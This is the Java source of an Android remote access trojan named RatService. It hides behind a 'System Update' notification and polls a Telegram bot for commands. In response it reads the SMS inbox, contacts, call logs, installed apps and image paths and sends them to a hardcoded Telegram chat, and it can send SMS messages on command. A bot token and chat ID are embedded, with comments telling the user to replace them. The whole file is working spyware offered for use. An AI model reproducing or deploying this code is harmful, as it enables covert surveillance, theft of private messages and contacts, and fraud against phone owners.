package com.system.update;

import android.app.*;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.*;
import android.telephony.SmsManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class RatService extends Service {
    private static final String BOT_TOKEN = "9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4"; // غيرها
    private static final String CHAT_ID = "6978974735";     // غيرها
    private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private long lastUpdateId = 0;
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        startPolling();
    }

    private void startForegroundService() {
        String channelId = "sys_chan";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        Notification notification = new Notification.Builder(this, channelId)
                .setContentTitle("System Update").setContentText("Updating...")
                .setSmallIcon(android.R.drawable.ic_menu_manage).build();
        startForeground(1, notification);
    }

    private void startPolling() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    URL url = new URL(TG_API + "getUpdates?offset=" + lastUpdateId + "&timeout=30");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) response.append(line);
                    reader.close();
                    JSONObject json = new JSONObject(response.toString());
                    JSONArray updates = json.getJSONArray("result");
                    for (int i = 0; i < updates.length(); i++) {
                        JSONObject update = updates.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id") + 1;
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) handleCommand(message.getString("text"));
                        }
                    }
                    Thread.sleep(1000);
                } catch (Exception e) { try { Thread.sleep(3000); } catch (InterruptedException ignored) {} }
            }
        }).start();
    }

    private void handleCommand(String cmd) {
        switch (cmd) {
            case "/info": sendText("Model: " + Build.MODEL + "\nBrand: " + Build.BRAND); break;
            case "/sms": sendSms(); break;
            case "/contacts": sendContacts(); break;
            case "/calls": sendCallLogs(); break;
            case "/apps": sendInstalledApps(); break;
            case "/images": sendImages(); break;
            default:
                if (cmd.startsWith("/send")) {
                    String[] p = cmd.split(" ", 3);
                    if (p.length == 3) { SmsManager.getDefault().sendTextMessage(p[1], null, p[2], null, null); sendText("SMS Sent!"); }
                }
        }
    }

    private void sendSms() {
        StringBuilder sb = new StringBuilder("📩 SMS:\n");
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
        if (c != null && c.moveToFirst()) { do { sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ").append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n"); } while (c.moveToNext()); c.close(); }
        sendText(sb.toString());
    }
    
    private void sendContacts() {
        StringBuilder sb = new StringBuilder("👥 Contacts:\n");
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null && c.moveToFirst()) { do { sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append("\n"); } while (c.moveToNext()); c.close(); }
        sendText(sb.toString());
    }

    private void sendCallLogs() {
        StringBuilder sb = new StringBuilder("📞 Calls:\n");
        Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 20");
        if (c != null && c.moveToFirst()) { do { sb.append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n"); } while (c.moveToNext()); c.close(); }
        sendText(sb.toString());
    }

    private void sendInstalledApps() {
        StringBuilder sb = new StringBuilder("📱 Apps:\n");
        for (android.content.pm.ApplicationInfo app : getPackageManager().getInstalledApplications(0)) { sb.append(app.packageName).append("\n"); }
        sendText(sb.toString());
    }

    private void sendImages() {
        StringBuilder sb = new StringBuilder("📸 Images paths:\n");
        Cursor c = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");
        if (c != null && c.moveToFirst()) { do { sb.append(c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))).append("\n"); } while (c.moveToNext()); c.close(); }
        sendText(sb.toString());
    }

    private void sendText(String text) {
        new Thread(() -> {
            try {
                String urlStr = TG_API + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.getInputStream().close();
            } catch (Exception ignored) {}
        }).start();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { isRunning = false; super.onDestroy(); }
}
